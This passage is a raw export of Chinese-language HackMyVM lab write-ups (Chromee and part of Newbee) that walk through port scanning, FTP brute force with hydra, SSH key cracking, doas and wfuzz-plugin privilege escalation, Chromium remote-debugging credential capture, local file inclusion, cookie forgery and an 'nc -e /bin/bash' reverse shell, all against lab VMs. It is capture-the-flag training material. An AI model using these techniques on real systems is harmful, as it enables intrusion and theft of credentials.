class=\"line\">Host is up (0.0019s latency).</span><br><span class=\"line\">Not shown: 65531 closed tcp ports (reset)</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">22/tcp    open  ssh</span><br><span class=\"line\">80/tcp    open  http</span><br><span class=\"line\">8080/tcp  open  http-proxy</span><br><span class=\"line\">23333/tcp open  elxmgmt</span><br><span class=\"line\">MAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><p>gobuster扫描目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.100&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-me</span><br><span class=\"line\">dium.txt -x .txt,.php</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.100</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Extensions:              txt,php</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/post.php             (Status: 200) [Size: 3]</span><br><span class=\"line\">/secret.php           (Status: 200) [Size: 549]</span><br></pre></td></tr></table></figure>\n\n<p>有一个post.php和secret.php,secret.php不会解析成php会直接下载下来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#secret.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;?php</span><br><span class=\"line\">    $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;早上好&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;下午好&#x27; : &#x27;晚上好&#x27;);</span><br><span class=\"line\">    $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">    echo &quot;&lt;h1&gt;&#123;$greeting&#125;，adriana&lt;/h1&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;p&gt;当前时间：&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;;</span><br><span class=\"line\">    echo &quot;&lt;p&gt;你的IP：&#123;$visitorIP&#125;&lt;/p&gt;&quot;;</span><br><span class=\"line\">    if (isset($_GET[&#x27;aaa&#x27;])) &#123;</span><br><span class=\"line\">    \t$file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;);</span><br><span class=\"line\">    \techo $file_content;</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">    \t\tdie();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    ?&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"8080端口\"><a href=\"#8080端口\" class=\"headerlink\" title=\"8080端口\"></a>8080端口</h1><p>先用gobuster扫描一下目录</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.100:8080&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2</span><br><span class=\"line\">.3-medium.txt</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.100:8080</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/javascript           (Status: 301) [Size: 328] [--&gt; http://192.168.31.100:8080/javascript/]</span><br><span class=\"line\">/silence              (Status: 403) [Size: 281]</span><br><span class=\"line\">/server-status        (Status: 403) [Size: 281]</span><br></pre></td></tr></table></figure>\n\n<p>有一个silence，访问发现Forbidden了</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee1.png\"></p>\n<p>用bp的BypassPro插件发现换一种请求会变成301，感觉有问题，后面添加一个index.html发现绕过了</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee2.png\"></p>\n<p>有一个邮箱，将这个域名添加进hosts里，再去访问<a href=\"http://chromee.hmv/secret.php%E5%8F%91%E7%8E%B0secret.php%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8CGET%E4%BC%A0%E5%85%A5aaa=1\">http://chromee.hmv/secret.php发现secret.php解析了，GET传入aaa=1</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">下午好，adriana</span><br><span class=\"line\">当前时间：2025-03-21 12:28:34</span><br><span class=\"line\"></span><br><span class=\"line\">你的IP：192.168.31.1</span><br><span class=\"line\"></span><br><span class=\"line\">The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.</span><br></pre></td></tr></table></figure>\n\n<p>这里有两个人名，adriana和Lily，用cupp各生成一个字典，然后将两个字典合并爆破ftp(23333端口)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f  -t 50</span><br><span class=\"line\">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class=\"line\"></span><br><span class=\"line\">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30</span><br><span class=\"line\">[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task</span><br><span class=\"line\">[DATA] attacking ftp://192.168.31.100:23333/</span><br><span class=\"line\">[23333][ftp] host: 192.168.31.100   login: adriana   password: Lily2020</span><br><span class=\"line\">[STATUS] attack finished for 192.168.31.100 (valid pair found)</span><br><span class=\"line\">1 of 1 target successfully completed, 1 valid password found</span><br><span class=\"line\">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31</span><br></pre></td></tr></table></figure>\n\n<p>爆破出了账号密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# ftp adriana@192.168.31.100 23333</span><br><span class=\"line\">Connected to 192.168.31.100.</span><br><span class=\"line\">220 (vsFTPd 3.0.3)</span><br><span class=\"line\">331 Please specify the password.</span><br><span class=\"line\">Password:</span><br><span class=\"line\">230 Login successful.</span><br><span class=\"line\">Remote system type is UNIX.</span><br><span class=\"line\">Using binary mode to transfer files.</span><br><span class=\"line\">ftp&gt; ls -al</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||20808|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxr-xr-x    2 106      115          4096 Mar 09 08:13 .</span><br><span class=\"line\">drwxr-xr-x    4 0        0            4096 Mar 09 08:12 ..</span><br><span class=\"line\">-rw-r--r--    1 0        0            3414 Mar 09 08:13 ...</span><br><span class=\"line\">-rw-r--r--    1 0        0             495 Mar 07 14:40 dic.txt</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>这有…文件，一开始以为是一个目录，cd不进去，也不看报错就没管了(唉，细节决定成败)导致卡了好长时间，但是卡的时候也没有荒废，在/srv目录下有一个zeus.conf，后面提权要用到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# cat zeus.conf</span><br><span class=\"line\">permit follower as softly cmd /usr/local/bin/wfuzz</span><br><span class=\"line\">permit nopass :softly as root cmd /usr/bin/chromium</span><br><span class=\"line\">permit nopass :softly as root cmd /usr/bin/kill</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; cd /home</span><br><span class=\"line\">250 Directory successfully changed.</span><br><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||5941|)</span><br><span class=\"line\">150 Here comes the directory listing.</span><br><span class=\"line\">drwxr-x---    5 1000     1000         4096 Mar 21 08:18 follower</span><br><span class=\"line\">drwxr-x---    5 1001     1001         4096 Mar 21 05:37 softly</span><br><span class=\"line\">226 Directory send OK.</span><br></pre></td></tr></table></figure>\n\n<p>还可以知道用户名</p>\n<p>…文件是一个私钥，john可以爆破出来密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# john 1 --show</span><br><span class=\"line\">id:cassandra</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# ssh follower@192.168.31.100 -i id</span><br><span class=\"line\">Enter passphrase for key &#x27;id&#x27;:</span><br><span class=\"line\">follower@Chromee:~$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><p>follower下有一个cat.git和note.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">follower@Chromee:~$ cat note.txt</span><br><span class=\"line\">Think about rotations and the cat’s secrets.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">47 is not just a number, it&#x27;s a twist of fate.</span><br></pre></td></tr></table></figure>\n\n<p>这个47提示的很明显是rot47</p>\n<p>cat.gif用convert可以分离出来12张图片，但是没有用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">convert cat.gif 1.jpg</span><br></pre></td></tr></table></figure>\n\n<p>不是空间轴可以试试时间轴</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# identify -format &quot;%T &quot; cat.gif</span><br><span class=\"line\">65 98 65 100 102 98 67 6 6 6 6 6 6</span><br></pre></td></tr></table></figure>\n\n<p>将后面的6个6去掉扔进cyberchef中解密然后rot47解密</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee3.png\"></p>\n<p>得到了p3p573r，因为前面拿到的zeus.conf能够知道follower需要密码才能以softly执行wfuzz</p>\n<p>先用find找到wfuzz的路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name &quot;wfuzz&quot; 2&gt;/dev/null</span><br><span class=\"line\">/home/follower/.config/wfuzz</span><br><span class=\"line\">/usr/local/bin/wfuzz</span><br><span class=\"line\">/usr/local/lib/python3.9/dist-packages/wfuzz    #这个就是wfuzz的路径</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2&gt;/dev/null</span><br><span class=\"line\">./plugins/payloads/file.py</span><br></pre></td></tr></table></figure>\n\n<p>在他的wfuzz的目录下找可以写的文件能找到file.py,cat一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.py</span><br><span class=\"line\">import pty</span><br><span class=\"line\">pty.spawn(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>不用想了，肯定是作者降低难度了后门都留好了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">follower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;</span><br><span class=\"line\">Password:</span><br><span class=\"line\"> /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class=\"line\">softly@Chromee:/home/follower$</span><br></pre></td></tr></table></figure>\n\n<p>上传pspy64，能发现每隔一段时间root用户都会执行secript.sh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">2025/03/21 12:53:01 CMD: UID=0     PID=1504   | /bin/sh -c /root/script.sh</span><br><span class=\"line\">2025/03/21 12:53:01 CMD: UID=0     PID=1505   | /bin/bash /root/script.sh</span><br></pre></td></tr></table></figure>\n\n<p>结合题目名Chromee和前面得到的zeus.conf，能猜到肯定和浏览器有关系，运行linpeas.sh能看到/media下有一个debug.kdbx</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class=\"line\">└─# file debug.kdbx</span><br><span class=\"line\">debug.kdbx: PDF document, version 1.7</span><br></pre></td></tr></table></figure>\n\n<p>是一个pdf文件</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee4.png\"></p>\n<p>去网上查这个东西，谷歌浏览器自带这个工具chrome://inspect/，还有这个9222的默认端口（后面要用到）</p>\n<p>先写一个authorized_keys</p>\n<p>在网上查到开启远程debug的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1</span><br></pre></td></tr></table></figure>\n\n<p>因为靶机没有桌面，所以一定要带上–headless，不然会报错，启动好后再用socat端口转发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">softly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee5.png\"></p>\n<p>用谷歌浏览器连接，打开第一个连接</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Chromee6.png\"></p>\n<p>等一会就会发现向127.0.0.1/post.php发送一个key，不用base64解码，这个就是root的密码。</p>\n<p>chromium的远程端口必须要是9222默认端口否则他监听不到就很难受</p>\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"Hackmyvm-Newbee","url":"/2025/03/26/Hackmyvm-Newbee/","content":"<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><p>arp-scan -l</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# arp-scan -l</span><br><span class=\"line\">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class=\"line\">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class=\"line\">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class=\"line\">192.168.31.2    08:00:27:f5:b9:af       PCS Systemtechnik GmbH</span><br><span class=\"line\">192.168.31.122  00:0c:29:71:20:21       VMware, Inc.</span><br><span class=\"line\"></span><br><span class=\"line\">3 packets received by filter, 0 packets dropped by kernel</span><br><span class=\"line\">Ending arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>192.168.31.122就是ip地址</p>\n<p>nmap 192.168.31.122 -p-扫描端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 192.168.31.122 -p-</span><br><span class=\"line\">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDT</span><br><span class=\"line\">Nmap scan report for 192.168.31.122</span><br><span class=\"line\">Host is up (0.00090s latency).</span><br><span class=\"line\">Not shown: 65533 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\">MAC Address: 00:0C:29:71:20:21 (VMware)</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"80端口\"><a href=\"#80端口\" class=\"headerlink\" title=\"80端口\"></a>80端口</h1><p>查看页面源码，在最下面可以发现有一个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--Wrong paramter to GET--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>对get参数进行fuzz</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u &quot;http://192.168.31.122?FUZZ=/etc/passwd&quot; --hh 18851</span><br><span class=\"line\"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class=\"line\">********************************************************</span><br><span class=\"line\">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class=\"line\">********************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">Target: http://192.168.31.122?FUZZ=/etc/passwd/</span><br><span class=\"line\">Total requests: 220559</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000001799:   200        376 L    1270 W     18863 Ch    &quot;hack&quot;</span><br></pre></td></tr></table></figure>\n\n<p>能fuzz出来参数名为hack，但是页面最下方还是会报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!-- include failed try another file --&gt;</span><br></pre></td></tr></table></figure>\n\n<p>尝试包含其他文件</p>\n<p>扫描目录可以扫描到一个secret.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# gobuster dir -u &quot;http://192.168.31.122/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-m</span><br><span class=\"line\">edium.txt -x .php,.txt</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.31.122/</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Extensions:              php,txt</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/.php                 (Status: 403) [Size: 279]</span><br><span class=\"line\">/index.php            (Status: 200) [Size: 18852]</span><br><span class=\"line\">/contact.php          (Status: 200) [Size: 8853]</span><br><span class=\"line\">/about.php            (Status: 200) [Size: 10036]</span><br><span class=\"line\">/blog.php             (Status: 200) [Size: 9782]</span><br><span class=\"line\">/products.php         (Status: 200) [Size: 12163]</span><br><span class=\"line\">/terms.php            (Status: 200) [Size: 6670]</span><br><span class=\"line\">/assets               (Status: 301) [Size: 317] [--&gt; http://192.168.31.122/assets/]</span><br><span class=\"line\">/testimonials.php     (Status: 200) [Size: 7907]</span><br><span class=\"line\">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.31.122/javascript/]</span><br><span class=\"line\">/checkout.php         (Status: 200) [Size: 13307]</span><br><span class=\"line\">/secret.php           (Status: 200) [Size: 2187]</span><br><span class=\"line\">/.php                 (Status: 403) [Size: 279]</span><br><span class=\"line\">/server-status        (Status: 403) [Size: 279]</span><br></pre></td></tr></table></figure>\n\n<p>secret.php可以执行命令，但是必须要先进行身份验证，用lfi包含secret.php试试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php</span><br></pre></td></tr></table></figure>\n\n<p>可以包含出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#secret.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html lang=&quot;zh-CN&quot;&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class=\"line\">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class=\"line\">    &lt;title&gt;命令行控制台&lt;/title&gt;</span><br><span class=\"line\">    &lt;style&gt;</span><br><span class=\"line\">        body &#123;</span><br><span class=\"line\">            background-color: #1e1e1e;</span><br><span class=\"line\">            font-family: Consolas, monospace;</span><br><span class=\"line\">            color: #fff;</span><br><span class=\"line\">            margin: 0;</span><br><span class=\"line\">            padding: 0;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .console &#123;</span><br><span class=\"line\">            width: 80%;</span><br><span class=\"line\">            margin: 50px auto;</span><br><span class=\"line\">            padding: 20px;</span><br><span class=\"line\">            background-color: #000;</span><br><span class=\"line\">            border-radius: 8px;</span><br><span class=\"line\">            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);</span><br><span class=\"line\">            height: 400px;</span><br><span class=\"line\">            overflow-y: auto;</span><br><span class=\"line\">            font-size: 16px;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .output &#123;</span><br><span class=\"line\">            white-space: pre-wrap;</span><br><span class=\"line\">            margin-bottom: 10px;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .input-container &#123;</span><br><span class=\"line\">            display: flex;</span><br><span class=\"line\">            align-items: center;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .input-container .prompt &#123;</span><br><span class=\"line\">            color: #00ff00;</span><br><span class=\"line\">            margin-right: 5px;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .input-container input &#123;</span><br><span class=\"line\">            background: transparent;</span><br><span class=\"line\">            border: none;</span><br><span class=\"line\">            color: #fff;</span><br><span class=\"line\">            width: 100%;</span><br><span class=\"line\">            padding: 5px;</span><br><span class=\"line\">            font-size: 16px;</span><br><span class=\"line\">            outline: none;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .input-container input:focus &#123;</span><br><span class=\"line\">            border: 1px solid #00ff00;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .input-container input::placeholder &#123;</span><br><span class=\"line\">            color: #888;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        .console-footer &#123;</span><br><span class=\"line\">            padding-top: 10px;</span><br><span class=\"line\">            color: #888;</span><br><span class=\"line\">            font-size: 12px;</span><br><span class=\"line\">            text-align: center;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;div class=&quot;console&quot;&gt;</span><br><span class=\"line\">    &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt;</span><br><span class=\"line\">        &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">        if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            if (isset($_GET[&#x27;command&#x27;])) &#123;</span><br><span class=\"line\">                $command = $_GET[&#x27;command&#x27;];</span><br><span class=\"line\">                $output = shell_exec($command);</span><br><span class=\"line\">                echo &#x27;&lt;div&gt;\\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class=\"line\">                echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ?&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;div class=&quot;input-container&quot;&gt;</span><br><span class=\"line\">        &lt;span class=&quot;prompt&quot;&gt;\\&gt;&lt;/span&gt;</span><br><span class=\"line\">        &lt;form method=&quot;get&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;command&quot; id=&quot;input&quot; placeholder=&quot;command...&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class=\"line\">        &lt;/form&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    const inputField = document.getElementById(&quot;input&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    inputField.focus();</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>伪造cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cookie: AreYouAdmin=yes</span><br></pre></td></tr></table></figure>\n\n<p>然后反弹shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -e /bin/bash 192.168.31.129 4444</span><br><span class=\"line\">script -qc /bin/bash /dev/null #获得交互式shell</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@Newbee:/var/www/html/shop$ sudo -l</span><br><span class=\"line\">sudo: unable to resolve host Newbee: Temporary failure in name resolution</span><br><span class=\"line\">Matching Defaults entries for www-data on Newbee:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,</span><br><span class=\"line\">    targetpw, use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User www-data may run the following commands on Newbee:</span><br><span class=\"line\">    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight 